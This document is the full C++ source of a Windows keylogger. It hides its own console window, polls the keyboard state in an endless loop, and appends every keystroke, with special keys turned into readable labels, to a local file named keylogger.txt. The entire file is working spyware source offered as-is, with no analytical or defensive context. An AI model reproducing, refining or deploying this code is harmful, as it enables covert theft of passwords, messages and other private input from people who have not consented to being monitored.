#include<iostream>
#include<fstream>
#include<windows.h>
#include<bits/stdc++.h>

// log file path

#define LOG_FILE "keylogger.txt"


// function to write data to a log file

void s_data(std::string val){
    std::fstream log_f;
    log_f.open(LOG_FILE,std::ios::app);
    log_f<<val;
    log_f.close();
}


// function to translata the special keys typed

std::string translateSpecialKey(int k){
    std::string res;
    switch(k){
        case VK_SPACE : res = " ";
             break;
        case VK_RETURN : res = "\n";
             break;
        case VK_BACK : res = "\b";
             break;
        case VK_CAPITAL : res = "[CAPS_LOCK]";
            break;
        case VK_LSHIFT  : res = "[LEFT SHIFT]";
           break;
        case VK_RSHIFT  : res = "[RIGHT SHIFT]";
           break;
        case VK_TAB : res = "[TAB]";
           break;
        case VK_CONTROL : res = "[CTRL]";
           break;
        case VK_LMENU : res = "[LEFT ALT]";
           break;
        case VK_RMENU  : res = "[RIGHT ALT]";
           break;
        case VK_LWIN  : res = "[LEFT WIN KEY]";
           break;
        default:
            break;
    }
    return res;
}


//main function

int main(){

    int skarr[] = {VK_CONTROL,VK_TAB,VK_MENU,VK_SHIFT,VK_CAPITAL,VK_BACK,VK_RETURN,VK_SPACE};
    std::string sc;
    bool isspecial;
    
    HWND hwnd = GetConsoleWindow();     //hides the terminal window
    ShowWindow(hwnd,SW_HIDE);

    while(1){
        for(int i=8;i<190;i++){
            if(GetAsyncKeyState(i) == -32767){   // check key is pressed
               // key is pressed
                isspecial = std::find(std::begin(skarr),std::end(skarr),i) != std::end(skarr);
                if(isspecial){
                    sc = translateSpecialKey(i);
                    s_data(sc);
                }
                else{
                    if(GetKeyState(VK_CAPITAL)){
                        //capslock is on
                        s_data(std::string(1,(char)i));
                    }
                    else{
                        //capslock is off
                        s_data(std::string(1,(char)std::tolower(i)));
                    }
                }
            }
           
        }
    }
    
    return 0;
}
